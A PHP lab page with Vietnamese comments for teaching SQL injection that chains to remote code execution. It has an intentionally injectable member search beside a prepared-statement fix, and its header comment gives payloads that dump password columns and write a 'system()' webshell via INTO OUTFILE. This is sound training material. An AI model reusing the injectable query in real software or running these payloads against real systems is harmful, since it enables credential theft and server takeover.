<?php
/*
 * LAB 6 - SQL INJECTION -> RCE qua INTO OUTFILE (CWE-89, OWASP A03, ATT&CK T1190)
 * -----------------------------------------------------------------------------
 * Kịch bản: ô tìm kiếm thành viên, nối thẳng input vào câu SQL (giống login_basic.php).
 * LỖI: SQL Injection. Nếu tài khoản DB có quyền FILE và secure_file_priv cho phép,
 *      có thể dùng UNION ... INTO OUTFILE để GHI WEBSHELL ra webroot -> RCE.
 *
 * (A) KHAI THÁC SQLi cơ bản (trích dữ liệu):
 *   q = ' OR '1'='1
 *   q = ' UNION SELECT 1,username,password FROM members-- -
 *   q = ' UNION SELECT 1,@@version,@@secure_file_priv-- -
 *
 * (B) CHAIN -> RCE (ghi webshell):
 *   q = ' UNION SELECT 1,'<?php system($_GET[\"c\"]); ?>','x' INTO OUTFILE '/shared/shell.php'-- -
 *   Sau đó gọi:  /vuln/uploads/shell.php?c=id
 *
 * ĐIỀU KIỆN để (B) chạy được (rất hay bị hỏi trong OSCP):
 *   1) User DB có quyền FILE.
 *   2) @@secure_file_priv = '' (hoặc trỏ tới thư mục ghi được) — xem docker-compose lab.
 *   3) Đường dẫn ghi được và web server đọc được. Ở lab này web+db là 2 container,
 *      nên ta dùng VOLUME CHUNG: db ghi vào /shared, web phục vụ nó tại /vuln/uploads.
 *   (Trên LAMP 1 máy thì ghi thẳng /var/www/html/shell.php.)
 *
 * CÁCH VÁ:
 *   - Prepared statements (xem login.php). Tài khoản DB tối thiểu quyền, BỎ quyền FILE.
 *   - secure_file_priv trỏ thư mục vô hại; web root không ghi được bởi DB.
 */

$db_host = getenv('DB_HOST') ?: 'localhost';
$db_pass = getenv('DB_PASS') ?: '';
$mode = $_GET['mode'] ?? 'vuln';
$q    = $_REQUEST['q'] ?? '';
$rows = [];
$shownSql = '';
$err = '';

if ($q !== '' || isset($_REQUEST['go'])) {
    $conn = new mysqli($db_host, 'root', $db_pass, 'php_login');
    if ($conn->connect_error) { die('DB lỗi: ' . $conn->connect_error); }
    $conn->set_charset('utf8mb4');

    if ($mode === 'safe') {
        // --- Bản vá: prepared statement ---
        $like = '%' . $q . '%';
        $stmt = $conn->prepare('SELECT id, username FROM members WHERE username LIKE ?');
        $stmt->bind_param('s', $like);
        $stmt->execute();
        $res = $stmt->get_result();
        while ($r = $res->fetch_assoc()) { $rows[] = $r; }
        $stmt->close();
        $shownSql = "SELECT id, username FROM members WHERE username LIKE ? [param=" . htmlspecialchars($like) . "]";
    } else {
        // === LỖI CỐ Ý: nối chuỗi trực tiếp ===
        $sql = "SELECT id, username, password FROM members WHERE username LIKE '%$q%'";
        $shownSql = $sql;
        $res = $conn->query($sql);
        if ($res === false) {
            $err = $conn->error;
        } else {
            while ($r = $res->fetch_row()) { $rows[] = $r; }
        }
    }
    $conn->close();
}
?>
<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><title>SQLi -> OUTFILE</title>
<style>body{font-family:Arial;max-width:820px;margin:30px auto}pre{background:#f0f0f0;padding:10px;overflow:auto}
table{border-collapse:collapse}td,th{border:1px solid #ccc;padding:4px 8px}.err{color:#c0392b}</style></head><body>
<h2>Lab 6 — Tìm thành viên (SQLi &rarr; RCE qua OUTFILE)</h2>
<p>Chế độ: <b><?= htmlspecialchars($mode) ?></b> — <a href="?mode=vuln">vuln</a> | <a href="?mode=safe">safe</a></p>
<form method="post" action="?mode=<?= htmlspecialchars($mode) ?>">
  Tên: <input name="q" size="50" value="<?= htmlspecialchars($q) ?>" placeholder="' UNION SELECT 1,@@version,@@secure_file_priv-- -">
  <input type="hidden" name="go" value="1"><button>Tìm</button>
</form>
<?php if ($shownSql): ?><p><small>SQL chạy:</small></p><pre><?= htmlspecialchars($shownSql) ?></pre><?php endif; ?>
<?php if ($err): ?><p class="err">SQL error: <?= htmlspecialchars($err) ?></p><?php endif; ?>
<?php if ($rows): ?>
  <table><?php foreach ($rows as $r): ?><tr><?php foreach ((array)$r as $c): ?><td><?= htmlspecialchars((string)$c) ?></td><?php endforeach; ?></tr><?php endforeach; ?></table>
<?php endif; ?>
<p><a href="index.php">&larr; Menu</a></p>
</body></html>
